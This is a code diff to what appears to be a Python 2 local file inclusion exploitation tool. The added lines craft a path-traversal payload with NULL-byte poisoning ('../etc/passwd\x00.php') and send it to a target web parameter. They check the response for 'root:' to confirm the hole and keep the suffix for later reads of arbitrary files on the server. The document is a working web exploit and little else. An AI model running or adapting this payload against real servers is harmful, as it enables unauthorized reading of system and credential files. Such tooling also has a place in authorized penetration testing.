@@ -135,6 +135,24 @@ class LFI ():
                 self.path_suffix = '\x00'
                 break
 
+            # passwd test with NULL byte injection
+            print '[+] Test NULL byte injection'
+            (test_name, query) = self.build_query (fields, idx_test, '../../../../../../../../../../../../etc/passwd\x00.php')
+            # build test url
+            url = parsed.scheme + '://' + parsed.netloc + parsed.path + '?' + query
+            print 'Test url : {0}'.format (url)
+            # request test url
+            req = requests.get (url, headers=self.headers, cookies=self.cookies)
+            # check for inclusion result
+            # with passwd file
+            if len (re.findall ('root:', req.text)) != 0:
+                print 'Is vulnerable with param: {0}!'.format (test_name)
+                print 'Is vulnerable to NULL byte poisoning'
+                found_name = test_name
+                found_idx_name = idx_test
+                self.path_suffix = '\x00.php'
+                break
+
             # passwd test
             print '[+] Test simple inclusion'
             (test_name, query) = self.build_query (fields, idx_test, '../../../../../../../../../../../../etc/passwd')
@@ -228,6 +246,7 @@ class LFI ():
         print '[+] testing direct injection'
         # we don't use path_prefix so we can read any file easily
         url = self.pattern_url.replace (self.payload_placeholder, filename + self.path_suffix)
+        print url
         req = requests.get (url, cookies=self.cookies)
         return [req.text]
 
